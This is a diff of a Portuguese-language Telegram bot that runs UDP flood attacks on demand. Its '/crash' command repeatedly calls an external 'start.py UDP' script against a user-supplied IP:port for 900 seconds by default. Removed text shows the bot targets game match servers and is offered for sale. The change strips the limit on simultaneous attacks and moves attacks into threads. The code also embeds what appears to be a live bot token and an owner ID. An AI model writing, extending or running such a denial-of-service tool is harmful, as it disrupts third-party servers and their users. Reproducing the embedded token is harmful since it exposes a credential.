@@ -3,15 +3,15 @@ import subprocess
 import re
 import json
 import time
+from threading import Thread
 
 # Configurações do bot
 BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
 SEU_ID_TELEGRAM = 6430703027
 bot = telebot.TeleBot(BOT_TOKEN)
 processos = {}  # Dicionário para gerenciar ataques
-MAX_ATTACKS = 3  # Limite de ataques simultâneos
 
-# Função para carregar usuários autorizados de um arquivo JSON
+# Função para carregar usuários autorizados
 def carregar_usuarios():
     try:
         with open("usuarios_autorizados.json", "r") as f:
@@ -21,7 +21,7 @@ def carregar_usuarios():
     except json.JSONDecodeError:
         return [SEU_ID_TELEGRAM]
 
-# Função para salvar usuários autorizados de um arquivo JSON
+# Função para salvar usuários autorizados
 def salvar_usuarios():
     with open("usuarios_autorizados.json", "w") as f:
         json.dump(authorized_users, f)
@@ -34,39 +34,11 @@ def validar_ip_porta(ip_porta):
     padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
     return re.match(padrao, ip_porta) is not None
 
-# Função para gerenciar o limite de ataques simultâneos
-def gerenciar_ataques():
-    if len(processos) >= MAX_ATTACKS:
-        ataque_antigo = list(processos.keys())[0]
-        processo_antigo = processos.pop(ataque_antigo)
-        processo_antigo.terminate()
-        bot.send_message(SEU_ID_TELEGRAM, f"Ataque para {ataque_antigo} finalizado para liberar espaço.")
-
-# Comando /start
-@bot.message_handler(commands=['start'])
-def start_message(message):
-    welcome_text = (
-        "Bem-vindo ao bot! 🚀\n\n"
-        "Aqui estão os comandos disponíveis para você:\n\n"
-        "*Comandos básicos:*\n"
-        "`/crash <IP da partida> [tempo]` - Envia um ataque ao IP especificado. "
-        "(Padrão 900 segundos)\n"
-        "`/meuid` - Mostra seu ID de usuário.\n\n"
-        "*Comandos para o dono do bot:*\n"
-        "`/adduser <ID>` - Adiciona um usuário autorizado.\n"
-        "`/removeuser <ID>` - Remove um usuário autorizado.\n"
-        "`/listusers` - Mostra a lista de usuários autorizados.\n\n"
-        "Quer comprar o bot? Entre em contato comigo no Telegram: "
-        "[werbert_ofc](https://t.me/werbert_ofc)\n\n"
-        "_Se precisar de ajuda, estou à disposição!_ 😉"
-    )
-    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
-
-# Função para executar o ataque em loop
+# Função para executar o ataque repetidamente por 900 segundos (ou tempo especificado)
 def executar_ataque(ip_porta, threads, duracao):
     tempo_inicial = time.time()
     while time.time() - tempo_inicial < int(duracao):
-        comando_terminal = f"python3 start.py UDP {ip_porta} {threads} 5"
+        comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {duracao}"
         subprocess.call(comando_terminal, shell=True)
         time.sleep(5)  # Aguarda 5 segundos antes de enviar novamente
 
@@ -79,29 +51,29 @@ def crash_server(message):
 
     comando = message.text.split()
     if len(comando) < 2:
-        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida> [tempo]")
+        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [tempo (em segundos)]")
         return
 
     ip_porta = comando[1]
-    tempo = "900"  # Padrão de tempo
+    threads = "10"  # Número de threads padrão
+    duracao = "900"  # Duração padrão de 900 segundos
 
     if not validar_ip_porta(ip_porta):
         bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
         return
 
+    # Verifica se o tempo foi especificado
     if len(comando) == 3:
-        tempo = comando[2]
+        try:
+            duracao = int(comando[2])
+        except ValueError:
+            bot.send_message(message.chat.id, "Tempo inválido. Use um número em segundos.")
+            return
 
-    if ip_porta in processos:
-        bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
-        return
-
-    gerenciar_ataques()
-    processo = subprocess.Popen(
-        lambda: executar_ataque(ip_porta, 10, tempo), shell=False
-    )
-    processos[ip_porta] = processo
-    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} por {tempo} segundos.")
+    # Inicia o ataque em uma nova thread
+    thread_ataque = Thread(target=executar_ataque, args=(ip_porta, threads, duracao))
+    thread_ataque.start()
+    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} por {duracao} segundos.")
 
 # Comando /meuid
 @bot.message_handler(commands=['meuid'])
